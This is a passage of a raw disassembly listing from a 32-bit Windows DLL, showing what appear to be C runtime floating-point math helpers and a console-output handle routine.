1000aaf1:	89 54 24 0c          	mov    %edx,0xc(%esp)
1000aaf5:	8b d4                	mov    %esp,%edx
1000aaf7:	83 c2 14             	add    $0x14,%edx
1000aafa:	89 54 24 08          	mov    %edx,0x8(%esp)
1000aafe:	89 54 24 04          	mov    %edx,0x4(%esp)
1000ab02:	89 14 24             	mov    %edx,(%esp)
1000ab05:	e8 29 0a 00 00       	call   0x1000b533
1000ab0a:	83 c4 10             	add    $0x10,%esp
1000ab0d:	dd 44 24 04          	fldl   0x4(%esp)
1000ab11:	c3                   	ret
1000ab12:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
1000ab18:	66 0f f3 ca          	psllq  %xmm2,%xmm1
1000ab1c:	66 0f 28 d8          	movapd %xmm0,%xmm3
1000ab20:	66 0f c2 c1 06       	cmpnlepd %xmm1,%xmm0
1000ab25:	3d ff 03 00 00       	cmp    $0x3ff,%eax
1000ab2a:	7c 25                	jl     0x1000ab51
1000ab2c:	3d 32 04 00 00       	cmp    $0x432,%eax
1000ab31:	7f b0                	jg     0x1000aae3
1000ab33:	66 0f 54 05 20 10 01 	andpd  0x10011020,%xmm0
1000ab3a:	10 
1000ab3b:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
1000ab3f:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
1000ab45:	dd 44 24 04          	fldl   0x4(%esp)
1000ab49:	c3                   	ret
1000ab4a:	dd 05 60 10 01 10    	fldl   0x10011060
1000ab50:	c3                   	ret
1000ab51:	66 0f c2 1d 40 10 01 	cmpnlepd 0x10011040,%xmm3
1000ab58:	10 06 
1000ab5a:	66 0f 54 1d 20 10 01 	andpd  0x10011020,%xmm3
1000ab61:	10 
1000ab62:	66 0f d6 5c 24 04    	movq   %xmm3,0x4(%esp)
1000ab68:	dd 44 24 04          	fldl   0x4(%esp)
1000ab6c:	c3                   	ret
1000ab6d:	8b ff                	mov    %edi,%edi
1000ab6f:	55                   	push   %ebp
1000ab70:	8b ec                	mov    %esp,%ebp
1000ab72:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000ab75:	33 c0                	xor    %eax,%eax
1000ab77:	38 01                	cmp    %al,(%ecx)
1000ab79:	74 0c                	je     0x1000ab87
1000ab7b:	3b 45 0c             	cmp    0xc(%ebp),%eax
1000ab7e:	74 07                	je     0x1000ab87
1000ab80:	40                   	inc    %eax
1000ab81:	80 3c 08 00          	cmpb   $0x0,(%eax,%ecx,1)
1000ab85:	75 f4                	jne    0x1000ab7b
1000ab87:	5d                   	pop    %ebp
1000ab88:	c3                   	ret
1000ab89:	33 c0                	xor    %eax,%eax
1000ab8b:	50                   	push   %eax
1000ab8c:	50                   	push   %eax
1000ab8d:	6a 03                	push   $0x3
1000ab8f:	50                   	push   %eax
1000ab90:	6a 03                	push   $0x3
1000ab92:	68 00 00 00 40       	push   $0x40000000
1000ab97:	68 68 10 01 10       	push   $0x10011068
1000ab9c:	ff 15 08 d0 00 10    	call   *0x1000d008
1000aba2:	a3 60 38 01 10       	mov    %eax,0x10013860
1000aba7:	c3                   	ret
1000aba8:	8b 0d 60 38 01 10    	mov    0x10013860,%ecx
1000abae:	83 f9 fe             	cmp    $0xfffffffe,%ecx
1000abb1:	75 0b                	jne    0x1000abbe
1000abb3:	e8 d1 ff ff ff       	call   0x1000ab89
1000abb8:	8b 0d 60 38 01 10    	mov    0x10013860,%ecx
1000abbe:	33 c0                	xor    %eax,%eax
1000abc0:	83 f9 ff             	cmp    $0xffffffff,%ecx
1000abc3:	0f 95 c0             	setne  %al
1000abc6:	c3                   	ret
1000abc7:	a1 60 38 01 10       	mov    0x10013860,%eax
1000abcc:	83 f8 ff             	cmp    $0xffffffff,%eax
1000abcf:	74 0c                	je     0x1000abdd
1000abd1:	83 f8 fe             	cmp    $0xfffffffe,%eax
1000abd4:	74 07                	je     0x1000abdd
1000abd6:	50                   	push   %eax
1000abd7:	ff 15 48 d0 00 10    	call   *0x1000d048
1000abdd:	c3                   	ret
1000abde:	8b ff                	mov    %edi,%edi
1000abe0:	55                   	push   %ebp
1000abe1:	8b ec                	mov    %esp,%ebp
1000abe3:	56                   	push   %esi
1000abe4:	6a 00                	push   $0x0
1000abe6:	ff 75 10             	push   0x10(%ebp)
1000abe9:	ff 75 0c             	push   0xc(%ebp)
1000abec:	ff 75 08             	push   0x8(%ebp)
1000abef:	ff 35 60 38 01 10    	push   0x10013860
1000abf5:	ff 15 04 d0 00 10    	call   *0x1000d004
1000abfb:	8b f0                	mov    %eax,%esi
1000abfd:	85 f6                	test   %esi,%esi
1000abff:	75 2d                	jne    0x1000ac2e
1000ac01:	ff 15 40 d0 00 10    	call   *0x1000d040
1000ac07:	83 f8 06             	cmp    $0x6,%eax
1000ac0a:	75 22                	jne    0x1000ac2e
1000ac0c:	e8 b6 ff ff ff       	call   0x1000abc7
1000ac11:	e8 73 ff ff ff       	call   0x1000ab89
1000ac16:	56                   	push   %esi
1000ac17:	ff 75 10             	push   0x10(%ebp)
1000ac1a:	ff 75 0c             	push   0xc(%ebp)
1000ac1d:	ff 75 08             	push   0x8(%ebp)
1000ac20:	ff 35 60 38 01 10    	push   0x10013860
1000ac26:	ff 15 04 d0 00 10    	call   *0x1000d004
1000ac2c:	8b f0                	mov    %eax,%esi
1000ac2e:	8b c6                	mov    %esi,%eax
1000ac30:	5e                   	pop    %esi
1000ac31:	5d                   	pop    %ebp
1000ac32:	c3                   	ret
1000ac33:	6a 0a                	push   $0xa
1000ac35:	ff 15 64 d0 00 10    	call   *0x1000d064
1000ac3b:	a3 8c 47 01 10       	mov    %eax,0x1001478c
1000ac40:	33 c0                	xor    %eax,%eax
1000ac42:	c3                   	ret
1000ac43:	cc                   	int3
1000ac44:	cc                   	int3
1000ac45:	cc                   	int3
1000ac46:	cc                   	int3
1000ac47:	cc                   	int3
1000ac48:	cc                   	int3
1000ac49:	cc                   	int3
1000ac4a:	cc                   	int3
1000ac4b:	cc                   	int3
1000ac4c:	cc                   	int3
1000ac4d:	cc                   	int3
1000ac4e:	cc                   	int3
1000ac4f:	cc                   	int3
1000ac50:	55                   	push   %ebp
1000ac51:	8b ec                	mov    %esp,%ebp
1000ac53:	83 ec 08             	sub    $0x8,%esp
1000ac56:	83 e4 f0             	and    $0xfffffff0,%esp
1000ac59:	dd 1c 24             	fstpl  (%esp)
1000ac5c:	f3 0f 7e 04 24       	movq   (%esp),%xmm0
1000ac61:	e8 08 00 00 00       	call   0x1000ac6e
1000ac66:	c9                   	leave
1000ac67:	c3                   	ret
1000ac68:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
1000ac6e:	ba 00 00 00 00       	mov    $0x0,%edx
1000ac73:	66 0f 28 e8          	movapd %xmm0,%xmm5
1000ac77:	66 0f 14 c0          	unpcklpd %xmm0,%xmm0
1000ac7b:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
1000ac80:	66 0f c5 cd 00       	pextrw $0x0,%xmm5,%ecx
1000ac85:	66 0f 28 0d 80 10 01 	movapd 0x10011080,%xmm1
1000ac8c:	10 
1000ac8d:	66 0f 28 15 90 10 01 	movapd 0x10011090,%xmm2
1000ac94:	10 
1000ac95:	66 0f 28 1d f0 10 01 	movapd 0x100110f0,%xmm3
1000ac9c:	10 
1000ac9d:	66 0f 28 25 a0 10 01 	movapd 0x100110a0,%xmm4
1000aca4:	10 
1000aca5:	66 0f 28 35 b0 10 01 	movapd 0x100110b0,%xmm6
1000acac:	10 
1000acad:	66 0f 54 c1          	andpd  %xmm1,%xmm0
1000acb1:	66 0f 56 c3          	orpd   %xmm3,%xmm0
1000acb5:	66 0f 58 e0          	addpd  %xmm0,%xmm4
1000acb9:	66 0f c5 c4 00       	pextrw $0x0,%xmm4,%eax
1000acbe:	25 f0 07 00 00       	and    $0x7f0,%eax
1000acc3:	66 0f 28 a0 c0 16 01 	movapd 0x100116c0(%eax),%xmm4
1000acca:	10 
1000accb:	66 0f 28 b8 b0 12 01 	movapd 0x100112b0(%eax),%xmm7
1000acd2:	10 
1000acd3:	66 0f 54 f0          	andpd  %xmm0,%xmm6
1000acd7:	66 0f 5c c6          	subpd  %xmm6,%xmm0
1000acdb:	66 0f 59 f4          	mulpd  %xmm4,%xmm6
1000acdf:	66 0f 5c f2          	subpd  %xmm2,%xmm6
1000ace3:	f2 0f 58 fe          	addsd  %xmm6,%xmm7
1000ace7:	66 0f 59 c4          	mulpd  %xmm4,%xmm0
1000aceb:	66 0f 28 e0          	movapd %xmm0,%xmm4
1000acef:	66 0f 58 c6          	addpd  %xmm6,%xmm0
1000acf3:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
1000acf9:	83 e9 01             	sub    $0x1,%ecx
1000acfc:	81 f9 fd 07 00 00    	cmp    $0x7fd,%ecx
1000ad02:	0f 87 be 00 00 00    	ja     0x1000adc6
1000ad08:	81 e9 fe 03 00 00    	sub    $0x3fe,%ecx
1000ad0e:	03 ca                	add    %edx,%ecx
1000ad10:	f2 0f 2a f1          	cvtsi2sd %ecx,%xmm6
1000ad14:	66 0f 14 f6          	unpcklpd %xmm6,%xmm6
1000ad18:	c1 e1 0a             	shl    $0xa,%ecx
1000ad1b:	03 c1                	add    %ecx,%eax
1000ad1d:	b9 10 00 00 00       	mov    $0x10,%ecx
1000ad22:	ba 00 00 00 00       	mov    $0x0,%edx
1000ad27:	83 f8 00             	cmp    $0x0,%eax
1000ad2a:	0f 44 d1             	cmove  %ecx,%edx
1000ad2d:	66 0f 28 0d 40 11 01 	movapd 0x10011140,%xmm1
1000ad34:	10 
1000ad35:	66 0f 28 d8          	movapd %xmm0,%xmm3
1000ad39:	66 0f 28 15 50 11 01 	movapd 0x10011150,%xmm2
1000ad40:	10 
1000ad41:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
1000ad45:	66 0f 59 db          	mulpd  %xmm3,%xmm3
1000ad49:	66 0f 58 ca          	addpd  %xmm2,%xmm1
1000ad4d:	66 0f 28 15 60 11 01 	movapd 0x10011160,%xmm2
1000ad54:	10 
1000ad55:	f2 0f 59 db          	mulsd  %xmm3,%xmm3
1000ad59:	66 0f 28 2d c0 10 01 	movapd 0x100110c0,%xmm5
1000ad60:	10 
1000ad61:	66 0f 59 f5          	mulpd  %xmm5,%xmm6
1000ad65:	66 0f 28 aa d0 10 01 	movapd 0x100110d0(%edx),%xmm5
1000ad6c:	10 
1000ad6d:	66 0f 54 e5          	andpd  %xmm5,%xmm4
1000ad71:	66 0f 58 fe          	addpd  %xmm6,%xmm7
1000ad75:	66 0f 58 fc          	addpd  %xmm4,%xmm7
1000ad79:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
1000ad7d:	f2 0f 59 d8          	mulsd  %xmm0,%xmm3
1000ad81:	66 0f 58 ca          	addpd  %xmm2,%xmm1
1000ad85:	66 0f 28 15 70 11 01 	movapd 0x10011170,%xmm2
1000ad8c:	10 
1000ad8d:	66 0f 59 d0          	mulpd  %xmm0,%xmm2
1000ad91:	66 0f 28 f7          	movapd %xmm7,%xmm6
1000ad95:	66 0f 15 f6          	unpckhpd %xmm6,%xmm6
1000ad99:	66 0f 59 cb          	mulpd  %xmm3,%xmm1
1000ad9d:	83 ec 10             	sub    $0x10,%esp
1000ada0:	66 0f 28 c1          	movapd %xmm1,%xmm0
1000ada4:	66 0f 58 ca          	addpd  %xmm2,%xmm1
1000ada8:	66 0f 15 c0          	unpckhpd %xmm0,%xmm0
1000adac:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
1000adb0:	f2 0f 58 c6          	addsd  %xmm6,%xmm0
1000adb4:	f2 0f 58 c7          	addsd  %xmm7,%xmm0
1000adb8:	66 0f 13 44 24 04    	movlpd %xmm0,0x4(%esp)
1000adbe:	dd 44 24 04          	fldl   0x4(%esp)
1000adc2:	83 c4 10             	add    $0x10,%esp
1000adc5:	c3                   	ret
1000adc6:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
1000adcc:	66 0f 28 0d 00 11 01 	movapd 0x10011100,%xmm1
1000add3:	10 
1000add4:	f2 0f c2 c8 00       	cmpeqsd %xmm0,%xmm1
1000add9:	66 0f c5 c1 00       	pextrw $0x0,%xmm1,%eax
1000adde:	83 f8 00             	cmp    $0x0,%eax
1000ade1:	77 48                	ja     0x1000ae2b
1000ade3:	83 f9 ff             	cmp    $0xffffffff,%ecx
1000ade6:	74 5e                	je     0x1000ae46
1000ade8:	81 f9 fe 07 00 00    	cmp    $0x7fe,%ecx
1000adee:	77 6c                	ja     0x1000ae5c
1000adf0:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
1000adf6:	66 0f 28 0d 80 10 01 	movapd 0x10011080,%xmm1
1000adfd:	10 
1000adfe:	66 0f 28 15 f0 10 01 	movapd 0x100110f0,%xmm2
1000ae05:	10 
1000ae06:	66 0f 54 c1          	andpd  %xmm1,%xmm0
1000ae0a:	66 0f 56 c2          	orpd   %xmm2,%xmm0
1000ae0e:	f2 0f c2 d0 00       	cmpeqsd %xmm0,%xmm2
1000ae13:	66 0f c5 c2 00       	pextrw $0x0,%xmm2,%eax
1000ae18:	83 f8 00             	cmp    $0x0,%eax
1000ae1b:	74 07                	je     0x1000ae24
1000ae1d:	dd 05 28 11 01 10    	fldl   0x10011128
1000ae23:	c3                   	ret
1000ae24:	ba e9 03 00 00       	mov    $0x3e9,%edx
1000ae29:	eb 4f                	jmp    0x1000ae7a
1000ae2b:	66 0f 12 15 f0 10 01 	movlpd 0x100110f0,%xmm2
1000ae32:	10 
1000ae33:	f2 0f 5e d0          	divsd  %xmm0,%xmm2
1000ae37:	66 0f 12 0d 20 11 01 	movlpd 0x10011120,%xmm1
1000ae3e:	10 
1000ae3f:	ba 08 00 00 00       	mov    $0x8,%edx
1000ae44:	eb 34                	jmp    0x1000ae7a
1000ae46:	66 0f 12 0d 10 11 01 	movlpd 0x10011110,%xmm1
1000ae4d:	10 
1000ae4e:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
1000ae52:	ba cc ff ff ff       	mov    $0xffffffcc,%edx
1000ae57:	e9 17 fe ff ff       	jmp    0x1000ac73
1000ae5c:	83 c1 01             	add    $0x1,%ecx
1000ae5f:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
1000ae65:	81 f9 ff 07 00 00    	cmp    $0x7ff,%ecx
1000ae6b:	73 3a                	jae    0x1000aea7
1000ae6d:	66 0f 57 c9          	xorpd  %xmm1,%xmm1
1000ae71:	f2 0f 5e c9          	divsd  %xmm1,%xmm1
1000ae75:	ba 09 00 00 00       	mov    $0x9,%edx
1000ae7a:	83 ec 1c             	sub    $0x1c,%esp
1000ae7d:	66 0f 13 4c 24 10    	movlpd %xmm1,0x10(%esp)
1000ae83:	89 54 24 0c          	mov    %edx,0xc(%esp)
1000ae87:	8b d4                	mov    %esp,%edx
1000ae89:	83 c2 10             	add    $0x10,%edx
1000ae8c:	89 54 24 08          	mov    %edx,0x8(%esp)
1000ae90:	83 c2 10             	add    $0x10,%edx
1000ae93:	89 54 24 04          	mov    %edx,0x4(%esp)
1000ae97:	89 14 24             	mov    %edx,(%esp)
1000ae9a:	e8 94 06 00 00       	call   0x1000b533
1000ae9f:	dd 44 24 10          	fldl   0x10(%esp)
1000aea3:	83 c4 1c             	add    $0x1c,%esp
1000aea6:	c3                   	ret
1000aea7:	66 0f 12 54 24 04    	movlpd 0x4(%esp),%xmm2
1000aead:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
1000aeb3:	66 0f 7e d0          	movd   %xmm2,%eax
1000aeb7:	66 0f 73 d2 20       	psrlq  $0x20,%xmm2
1000aebc:	66 0f 7e d1          	movd   %xmm2,%ecx
1000aec0:	81 e1 ff ff 0f 00    	and    $0xfffff,%ecx
1000aec6:	0b c1                	or     %ecx,%eax
1000aec8:	83 f8 00             	cmp    $0x0,%eax
1000aecb:	74 a0                	je     0x1000ae6d
1000aecd:	ba e9 03 00 00       	mov    $0x3e9,%edx
1000aed2:	eb a6                	jmp    0x1000ae7a
1000aed4:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000aedb:	eb 03                	jmp    0x1000aee0
1000aedd:	cc                   	int3
1000aede:	cc                   	int3
1000aedf:	cc                   	int3
1000aee0:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
1000aee7:	0a ed                	or     %ch,%ch
1000aee9:	75 4a                	jne    0x1000af35
1000aeeb:	d9 c9                	fxch   %st(1)
1000aeed:	d9 f1                	fyl2x
1000aeef:	eb 1c                	jmp    0x1000af0d
1000aef1:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000aef8:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000aeff:	90                   	nop
1000af00:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
1000af07:	32 ed                	xor    %ch,%ch
1000af09:	d9 ea                	fldl2e
1000af0b:	de c9                	fmulp  %st,%st(1)
1000af0d:	e8 2b 01 00 00       	call   0x1000b03d
1000af12:	d9 e8                	fld1
1000af14:	de c1                	faddp  %st,%st(1)
1000af16:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
1000af1d:	74 04                	je     0x1000af23
1000af1f:	d9 e8                	fld1
1000af21:	de f1                	fdivp  %st,%st(1)
1000af23:	f6 c2 40             	test   $0x40,%dl
1000af26:	75 02                	jne    0x1000af2a
1000af28:	d9 fd                	fscale
1000af2a:	0a ed                	or     %ch,%ch
1000af2c:	74 02                	je     0x1000af30
1000af2e:	d9 e0                	fchs
1000af30:	e9 cf 02 00 00       	jmp    0x1000b204
1000af35:	e8 46 01 00 00       	call   0x1000b080
1000af3a:	0b c0                	or     %eax,%eax
1000af3c:	74 14                	je     0x1000af52
1000af3e:	32 ed                	xor    %ch,%ch
1000af40:	83 f8 02             	cmp    $0x2,%eax
1000af43:	74 02                	je     0x1000af47
1000af45:	f6 d5                	not    %ch
1000af47:	d9 c9                	fxch   %st(1)
1000af49:	d9 e1                	fabs
1000af4b:	eb a0                	jmp    0x1000aeed
1000af4d:	e9 eb 02 00 00       	jmp    0x1000b23d
1000af52:	e9 a9 03 00 00       	jmp    0x1000b300
1000af57:	dd d8                	fstp   %st(0)
1000af59:	dd d8                	fstp   %st(0)
1000af5b:	db 2d 80 11 01 10    	fldt   0x10011180
1000af61:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
1000af68:	c3                   	ret
1000af69:	d9 ed                	fldln2
1000af6b:	d9 c9                	fxch   %st(1)
1000af6d:	d9 e4                	ftst
1000af6f:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000af76:	9b                   	fwait
1000af77:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
1000af7e:	75 d2                	jne    0x1000af52
1000af80:	d9 f1                	fyl2x
1000af82:	c3                   	ret
1000af83:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
1000af8a:	dd d8                	fstp   %st(0)
1000af8c:	db 2d 8a 11 01 10    	fldt   0x1001118a
1000af92:	c3                   	ret
1000af93:	0a c9                	or     %cl,%cl
1000af95:	75 53                	jne    0x1000afea
1000af97:	c3                   	ret
1000af98:	d9 ec                	fldlg2
1000af9a:	eb 02                	jmp    0x1000af9e
1000af9c:	d9 ed                	fldln2
1000af9e:	d9 c9                	fxch   %st(1)
1000afa0:	0a c9                	or     %cl,%cl
1000afa2:	75 ae                	jne    0x1000af52
1000afa4:	d9 f1                	fyl2x
1000afa6:	c3                   	ret
1000afa7:	e9 91 02 00 00       	jmp    0x1000b23d
1000afac:	e8 cf 00 00 00       	call   0x1000b080
1000afb1:	dd d8                	fstp   %st(0)
1000afb3:	dd d8                	fstp   %st(0)
1000afb5:	0a c9                	or     %cl,%cl
1000afb7:	75 0e                	jne    0x1000afc7
1000afb9:	d9 ee                	fldz
1000afbb:	83 f8 01             	cmp    $0x1,%eax
1000afbe:	75 06                	jne    0x1000afc6
1000afc0:	0a ed                	or     %ch,%ch
1000afc2:	74 02                	je     0x1000afc6
1000afc4:	d9 e0                	fchs
1000afc6:	c3                   	ret
1000afc7:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
1000afce:	db 2d 80 11 01 10    	fldt   0x10011180
1000afd4:	83 f8 01             	cmp    $0x1,%eax
1000afd7:	75 ed                	jne    0x1000afc6
1000afd9:	0a ed                	or     %ch,%ch
1000afdb:	74 e9                	je     0x1000afc6
1000afdd:	d9 e0                	fchs
1000afdf:	eb e5                	jmp    0x1000afc6
1000afe1:	dd d8                	fstp   %st(0)
1000afe3:	e9 42 02 00 00       	jmp    0x1000b22a
1000afe8:	dd d8                	fstp   %st(0)
1000afea:	e9 13 03 00 00       	jmp    0x1000b302
1000afef:	58                   	pop    %eax
1000aff0:	d9 e4                	ftst
1000aff2:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000aff9:	9b                   	fwait
1000affa:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
1000b001:	75 0f                	jne    0x1000b012
1000b003:	dd d8                	fstp   %st(0)
1000b005:	db 2d 80 11 01 10    	fldt   0x10011180
1000b00b:	0a ed                	or     %ch,%ch
1000b00d:	74 02                	je     0x1000b011
1000b00f:	d9 e0                	fchs
1000b011:	c3                   	ret
1000b012:	c6 85 70 ff ff ff 04 	movb   $0x4,-0x90(%ebp)
1000b019:	e9 0c 02 00 00       	jmp    0x1000b22a
1000b01e:	dd d8                	fstp   %st(0)
1000b020:	dd d8                	fstp   %st(0)
1000b022:	db 2d 80 11 01 10    	fldt   0x10011180
1000b028:	c6 85 70 ff ff ff 03 	movb   $0x3,-0x90(%ebp)
1000b02f:	c3                   	ret
1000b030:	0a c9                	or     %cl,%cl
1000b032:	75 af                	jne    0x1000afe3
1000b034:	dd d8                	fstp   %st(0)
1000b036:	db 2d 80 11 01 10    	fldt   0x10011180
1000b03c:	c3                   	ret
1000b03d:	d9 c0                	fld    %st(0)
1000b03f:	d9 e1                	fabs
1000b041:	db 2d 9e 11 01 10    	fldt   0x1001119e
1000b047:	de d9                	fcompp
1000b049:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000b050:	9b                   	fwait
1000b051:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
1000b058:	75 95                	jne    0x1000afef
1000b05a:	d9 c0                	fld    %st(0)
1000b05c:	d9 fc                	frndint
1000b05e:	d9 e4                	ftst
1000b060:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000b067:	9b                   	fwait
1000b068:	8a 95 61 ff ff ff    	mov    -0x9f(%ebp),%dl
1000b06e:	d9 c9                	fxch   %st(1)
1000b070:	d8 e1                	fsub   %st(1),%st
1000b072:	d9 e4                	ftst
1000b074:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000b07b:	d9 e1                	fabs
1000b07d:	d9 f0                	f2xm1
1000b07f:	c3                   	ret
1000b080:	d9 c0                	fld    %st(0)
1000b082:	d9 fc                	frndint
1000b084:	d8 d9                	fcomp  %st(1)
1000b086:	9b df e0             	fstsw  %ax
1000b089:	9e                   	sahf
1000b08a:	75 1a                	jne    0x1000b0a6
1000b08c:	d9 c0                	fld    %st(0)
1000b08e:	dc 0d b2 11 01 10    	fmull  0x100111b2
1000b094:	d9 c0                	fld    %st(0)
1000b096:	d9 fc                	frndint
1000b098:	de d9                	fcompp
1000b09a:	9b df e0             	fstsw  %ax
1000b09d:	9e                   	sahf
1000b09e:	74 0d                	je     0x1000b0ad
1000b0a0:	b8 01 00 00 00       	mov    $0x1,%eax
1000b0a5:	c3                   	ret
1000b0a6:	b8 00 00 00 00       	mov    $0x0,%eax
1000b0ab:	eb f8                	jmp    0x1000b0a5
1000b0ad:	b8 02 00 00 00       	mov    $0x2,%eax
1000b0b2:	eb f1                	jmp    0x1000b0a5
1000b0b4:	56                   	push   %esi
1000b0b5:	83 ec 74             	sub    $0x74,%esp
1000b0b8:	8b f4                	mov    %esp,%esi
1000b0ba:	56                   	push   %esi
1000b0bb:	83 ec 08             	sub    $0x8,%esp
1000b0be:	dd 1c 24             	fstpl  (%esp)
1000b0c1:	83 ec 08             	sub    $0x8,%esp
1000b0c4:	dd 1c 24             	fstpl  (%esp)
1000b0c7:	9b dd 76 08          	fsave  0x8(%esi)
1000b0cb:	e8 7d 08 00 00       	call   0x1000b94d
1000b0d0:	83 c4 14             	add    $0x14,%esp
1000b0d3:	dd 66 08             	frstor 0x8(%esi)
1000b0d6:	dd 06                	fldl   (%esi)
1000b0d8:	83 c4 74             	add    $0x74,%esp
1000b0db:	5e                   	pop    %esi
1000b0dc:	85 c0                	test   %eax,%eax
1000b0de:	74 05                	je     0x1000b0e5
1000b0e0:	e9 2e 02 00 00       	jmp    0x1000b313
1000b0e5:	c3                   	ret
1000b0e6:	cc                   	int3
1000b0e7:	cc                   	int3
1000b0e8:	cc                   	int3
1000b0e9:	cc                   	int3
1000b0ea:	cc                   	int3
1000b0eb:	cc                   	int3
1000b0ec:	cc                   	int3
1000b0ed:	cc                   	int3
1000b0ee:	cc                   	int3
1000b0ef:	cc                   	int3
1000b0f0:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
1000b0f4:	75 11                	jne    0x1000b107
1000b0f6:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
1000b0fd:	80 cf 02             	or     $0x2,%bh
1000b100:	80 e7 fe             	and    $0xfe,%bh
1000b103:	b3 3f                	mov    $0x3f,%bl
1000b105:	eb 04                	jmp    0x1000b10b
1000b107:	66 bb 3f 13          	mov    $0x133f,%bx
1000b10b:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
1000b112:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
1000b118:	bb 0e 12 01 10       	mov    $0x1001120e,%ebx
1000b11d:	d9 e5                	fxam
1000b11f:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
1000b125:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000b12c:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b133:	9b                   	fwait
1000b134:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
1000b13a:	d0 e1                	shl    $1,%cl
1000b13c:	d0 f9                	sar    $1,%cl
1000b13e:	d0 c1                	rol    $1,%cl
1000b140:	8a c1                	mov    %cl,%al
1000b142:	24 0f                	and    $0xf,%al
1000b144:	d7                   	xlat   %ds:(%ebx)
1000b145:	0f be c0             	movsbl %al,%eax
1000b148:	81 e1 04 04 00 00    	and    $0x404,%ecx
1000b14e:	8b da                	mov    %edx,%ebx
1000b150:	03 d8                	add    %eax,%ebx
1000b152:	83 c3 10             	add    $0x10,%ebx
1000b155:	50                   	push   %eax
1000b156:	52                   	push   %edx
1000b157:	51                   	push   %ecx
1000b158:	8b 0b                	mov    (%ebx),%ecx
1000b15a:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000b160:	59                   	pop    %ecx
1000b161:	5a                   	pop    %edx
1000b162:	58                   	pop    %eax
1000b163:	ff 23                	jmp    *(%ebx)
1000b165:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
1000b169:	75 11                	jne    0x1000b17c
1000b16b:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
1000b172:	80 cf 02             	or     $0x2,%bh
1000b175:	80 e7 fe             	and    $0xfe,%bh
1000b178:	b3 3f                	mov    $0x3f,%bl
1000b17a:	eb 04                	jmp    0x1000b180
1000b17c:	66 bb 3f 13          	mov    $0x133f,%bx
1000b180:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
1000b187:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
1000b18d:	bb 0e 12 01 10       	mov    $0x1001120e,%ebx
1000b192:	d9 e5                	fxam
1000b194:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
1000b19a:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000b1a1:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b1a8:	d9 c9                	fxch   %st(1)
1000b1aa:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
1000b1b0:	d9 e5                	fxam
1000b1b2:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
1000b1b9:	d9 c9                	fxch   %st(1)
1000b1bb:	8a ad 61 ff ff ff    	mov    -0x9f(%ebp),%ch
1000b1c1:	d0 e5                	shl    $1,%ch
1000b1c3:	d0 fd                	sar    $1,%ch
1000b1c5:	d0 c5                	rol    $1,%ch
1000b1c7:	8a c5                	mov    %ch,%al
1000b1c9:	24 0f                	and    $0xf,%al
1000b1cb:	d7                   	xlat   %ds:(%ebx)
1000b1cc:	8a e0                	mov    %al,%ah
1000b1ce:	d0 e1                	shl    $1,%cl
1000b1d0:	d0 f9                	sar    $1,%cl
1000b1d2:	d0 c1                	rol    $1,%cl
1000b1d4:	8a c1                	mov    %cl,%al
1000b1d6:	24 0f                	and    $0xf,%al
1000b1d8:	d7                   	xlat   %ds:(%ebx)
1000b1d9:	d0 e4                	shl    $1,%ah
1000b1db:	d0 e4                	shl    $1,%ah
1000b1dd:	0a c4                	or     %ah,%al
1000b1df:	0f be c0             	movsbl %al,%eax
1000b1e2:	81 e1 04 04 00 00    	and    $0x404,%ecx
1000b1e8:	8b da                	mov    %edx,%ebx
1000b1ea:	03 d8                	add    %eax,%ebx
1000b1ec:	83 c3 10             	add    $0x10,%ebx
1000b1ef:	50                   	push   %eax
1000b1f0:	52                   	push   %edx
1000b1f1:	51                   	push   %ecx
